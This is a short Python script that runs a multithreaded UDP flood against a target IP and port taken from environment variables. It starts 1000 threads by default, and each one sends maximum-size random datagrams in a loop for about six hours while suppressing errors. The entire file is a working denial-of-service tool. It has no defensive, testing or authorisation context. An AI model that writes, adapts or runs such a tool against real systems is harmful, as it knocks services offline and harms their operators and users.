#!/usr/bin/env python3
import os
import socket
import threading
import time

TARGET_IP = os.getenv("TARGET_IP")
TARGET_PORT = int(os.getenv("TARGET_PORT", "80"))
THREADS = int(os.getenv("THREADS", "1000"))
DURATION = 21000

running = True

def flood(ip, port):
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(os.urandom(65507), (ip, port))
            s.close()
        except:
            pass

def main():
    print(f"🚀 UDP Flood on {TARGET_IP}:{TARGET_PORT}")
    print(f"🧵 Threads: {THREADS}")
    for i in range(THREADS):
        t = threading.Thread(target=flood, args=(TARGET_IP, TARGET_PORT))
        t.daemon = True
        t.start()
    print(f"✅ {THREADS} threads started")
    time.sleep(DURATION)

if __name__ == "__main__":
    main()